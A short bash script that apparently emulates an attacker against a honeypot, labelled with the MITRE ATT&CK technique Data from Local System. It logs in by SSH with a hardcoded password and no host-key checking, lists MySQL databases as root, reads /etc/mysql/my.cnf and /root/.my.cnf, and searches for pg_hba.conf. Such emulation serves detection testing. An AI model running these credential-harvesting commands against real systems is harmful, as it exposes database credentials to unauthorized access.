#!/usr/bin/env bash
# S29 — Database Credential Hunt
# Tactic : Collection (TA0009)
# Technique: T1005 Data from Local System
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S29 Database Credential Hunt — ${TARGET} ==="
timeout ${TIMEOUT:-45} $SSH "mysql -u root -e 'show databases;' 2>/dev/null || echo 'mysql failed'; cat /etc/mysql/my.cnf 2>/dev/null; cat /root/.my.cnf 2>/dev/null; find /etc /var -name 'pg_hba.conf' 2>/dev/null; exit 0" && echo "[OK]" || echo "[FAIL]"
